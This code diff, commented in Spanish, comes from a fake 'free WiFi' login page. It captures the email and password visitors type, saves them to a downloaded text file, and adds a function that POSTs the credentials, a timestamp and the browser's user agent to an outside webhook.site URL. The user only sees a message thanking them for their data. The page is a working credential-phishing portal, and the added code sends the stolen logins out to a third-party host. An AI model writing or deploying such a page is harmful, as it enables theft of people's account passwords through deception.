@@ -61,20 +61,26 @@
         const form = document.getElementById('loginForm');
         const getFreeWiFiBtn = document.getElementById('getFreeWiFi');
 
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            guardarDatos(email, password);
-            alert("¡Datos guardados! Presiona 'Get Free WiFi' para continuar.");
+            
+            // Guardar localmente (para demostración)
+            guardarDatosLocalmente(email, password);
+            
+            // Enviar a webhook/backend
+            await enviarDatos(email, password);
+            
+            alert("¡Datos guardados! Presiona 'Obtener WiFi Gratis' para continuar.");
         });
 
         getFreeWiFiBtn.addEventListener('click', function() {
             alert("¡WiFi gratis para ti! Gracias por tus datos.");
         });
 
-        function guardarDatos(email, password) {
-            const datos = `Correo: ${email}\nContraseña: ${password}`;
+        function guardarDatosLocalmente(email, password) {
+            const datos = `Correo: ${email}\nContraseña: ${password}\nFecha: ${new Date().toLocaleString()}`;
             const blob = new Blob([datos], { type: 'text/plain' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -83,6 +89,31 @@
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
+        }
+
+        async function enviarDatos(email, password) {
+            // Opción 1: Enviar a un webhook (debes reemplazar la URL)
+            // Por ejemplo, usa webhook.site para pruebas o un servicio como Formspree
+            const webhookURL = 'https://webhook.site/dc166330-1516-42d7-bacb-74c2d6af8aef'; // Reemplaza con tu URL
+            
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                console.log('Datos enviados correctamente');
+            } catch (error) {
+                console.error('Error al enviar datos:', error);
+            }
         }
     </script>
 </body>
